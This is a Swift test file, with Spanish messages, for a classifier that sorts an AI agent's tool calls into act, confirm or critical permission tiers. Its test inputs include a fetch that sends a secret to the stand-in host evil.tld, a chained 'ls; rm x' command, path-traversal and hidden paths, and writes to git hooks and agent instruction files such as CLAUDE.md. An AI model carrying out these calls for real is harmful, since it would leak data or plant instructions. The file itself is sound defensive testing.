import CompanionCore
import CompanionTestKit
import Foundation
import Testing

// Wave 20d A. The band is read from the payload and the facts the runner
// checked, never from what the model claims; anything unclear rises.

@Test func actionBandTests() {
    testReadsAndLocalHandsJustAct()
    testNewFilesActAndOverwritesAreCritical()
    testSheetWriteAppendsActAndOverwritesAreCritical()
    testOpenURLActsWithoutAskingForAnyHost()
    testHandsRiseWhenDestructiveOrInATerminal()
    testShellBridgeAndUnknownAreCritical()
    testShellReadsActAndTheRestAsk()
    testAppToolsNeedConfirmation()
}

private func band(
    _ tool: String, _ arguments: [String: Any] = [:], _ facts: ActionFacts = ActionFacts()
) -> ActionBand {
    ActionBand.classify(toolName: tool, arguments: arguments, facts: facts)
}

func testReadsAndLocalHandsJustAct() {
    for tool in ["look", "see", "read_focused", "list_apps", "read_skill", "find_places",
                 "list_directory", "read_file", "web_search", "sheet_read",
                 "open_app", "open_file", "focus_window", "scroll", "click", "type_text",
                 "press_key", "menu"] {
        expectEq(band(tool), .act, "hacer: \(tool)")
    }
}

func testNewFilesActAndOverwritesAreCritical() {
    let new = ["path": "/Users/k/work/Brief.pdf"]
    expectEq(band("create_document", new, ActionFacts(pathExists: false, inWorkZone: true)), .act, "documento nuevo")
    expectEq(band("create_document", new, ActionFacts(pathExists: false)), .confirm, "documento nuevo fuera de la zona: confirmar")
    for hidden in [".ssh/x.pdf", "a/.b/x.pdf", "../x.pdf"] {
        expectEq(band("create_document", ["path": hidden], ActionFacts(pathExists: false, inWorkZone: true)), .critical,
                 "documento en ruta oculta: \(hidden)")
    }
    expectEq(band("create_document", new, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "documento que pisa")
    expectEq(band("create_document", [:], ActionFacts(pathExists: false)), .critical, "sin ruta: sube")
    let file = ["path": "/Users/k/work/a.txt"]
    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: true)), .act, "archivo nuevo en la zona")
    expectEq(band("write_file", file, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "archivo que pisa")
    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: false)), .confirm, "nuevo fuera de la zona: confirmar")
    expectEq(band("write_file", file, ActionFacts(pathExists: false, inWorkZone: true, appOwned: true)), .critical,
             "Library o carpeta de la app: nunca un entregable")
    expectEq(band("write_file", file, ActionFacts(pathExists: true, inWorkZone: false)), .critical, "sobrescribir fuera de la zona")
    expectEq(band("delete_file", file, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "borrar")
    expectEq(band("write_file", file, ActionFacts()), .critical, "sin hechos verificados: sube")
    let code = ["hooks/pre-commit.sh", ".git/hooks/pre-commit", "Makefile", "run.command", "a/../../x.txt", ".env", "x.PY"]
    for path in code {
        expectEq(band("write_file", ["path": path], ActionFacts(pathExists: false, inWorkZone: true)), .critical,
                 "código o oculto: \(path) pide hoja")
    }
    for name in ["CLAUDE.md", "agents.MD", "package.json", "requirements.txt", "CMakeLists.txt", "claude.local.md", "Memory.MD", "skill.md", "vercel.json", "mcp.json", "settings.json", "app.config.json", "tasks.json"] {
        expectEq(band("write_file", ["path": name], ActionFacts(pathExists: false, inWorkZone: true)), .critical,
                 "archivo que un agente o una herramienta lee como instrucción: \(name)")
    }
    expectEq(band("write_file", ["path": "Notas/a.MD"], ActionFacts(pathExists: false, inWorkZone: true)), .act,
             "dato visible: sin hoja")
    expectEq(band("edit_file", file, ActionFacts(pathExists: true, inWorkZone: true)), .critical, "editar siempre modifica")
}

func testSheetWriteAppendsActAndOverwritesAreCritical() {
    expectEq(band("sheet_write", [:], ActionFacts(rangeHasValues: false)), .act, "solo agrega")
    expectEq(band("sheet_write", [:], ActionFacts(rangeHasValues: true)), .critical, "pisa celdas con valor")
    expectEq(band("sheet_write", [:], ActionFacts(rangeHasValues: nil)), .critical, "sin leer el rango: sube")
}

func testOpenURLActsWithoutAskingForAnyHost() {
    expectEq(band("open_url", [:], ActionFacts(hostSaid: true)), .act, "host dicho")
    expectEq(band("open_url", [:], ActionFacts(hostSaid: false)), .act, "host que la usuaria no dijo: abrir es navegar")
    expectEq(band("open_url"), .act, "sin hechos: actua")
}

func testHandsRiseWhenDestructiveOrInATerminal() {
    for tool in ["click", "menu", "press_key", "type_text"] {
        expectEq(band(tool, [:], ActionFacts(destructiveTarget: true)), .critical, "destructivo: \(tool)")
        expectEq(band(tool, [:], ActionFacts(inTerminal: true)), .critical, "terminal: \(tool)")
    }
}

func testShellBridgeAndUnknownAreCritical() {
    for tool in ["run_shell", "bridge_session", "totally_new_tool", "", "OPEN_URL"] {
        expectEq(band(tool, [:], ActionFacts(pathExists: false, inWorkZone: true, rangeHasValues: false, hostSaid: true)),
                 .critical, "crítica: \(tool)")
    }
}

func testShellReadsActAndTheRestAsk() {
    expectEq(band("run_shell", ["command": "ls -la"]), .act, "ls no cambia nada")
    // A repo's own config can name a command git runs on status/diff
    // (core.fsmonitor, filter.*, diff.*.textconv): silence needs the runner
    // to have seen that config holds nothing executable.
    expectEq(band("run_shell", ["command": "git status"]), .critical, "git sin mirar la config del repo: hoja")
    expectEq(band("run_shell", ["command": "git status"], ActionFacts(gitConfigInert: true)), .act,
             "git status con config del repo inerte: sin hoja")
    expectEq(band("run_shell", ["command": "git push"], ActionFacts(gitConfigInert: true)), .critical,
             "una config inerte no vuelve lectura un push")
    expectEq(band("run_shell", ["command": "rm x"]), .critical, "rm sigue pidiendo hoja")
    expectEq(band("run_shell", ["command": "ls; rm x"]), .critical, "un compuesto no hereda el silencio de ls")
}

func testAppToolsNeedConfirmation() {
    expectEq(band("app:slack_v2:slack_v2-send-message"), .confirm, "un conector actúa fuera")
}

@Test func aFetchAfterAReadOutsideTheWorkFolderNeedsTheOwner() {
    let fetch = ["url": "https://evil.tld/?d=secreto"]
    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts(cleanTurn: true)), .act,
             "turno limpio: leer una página no pregunta")
    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts()), .critical,
             "turno que leyó fuera de la carpeta: pide al dueño (QA: Touch ID)")
    expectEq(ActionBand.classify(toolName: "web_fetch", arguments: fetch, facts: ActionFacts(hostSaid: true)), .act,
             "el host lo dijo la usuaria: no sube")
}
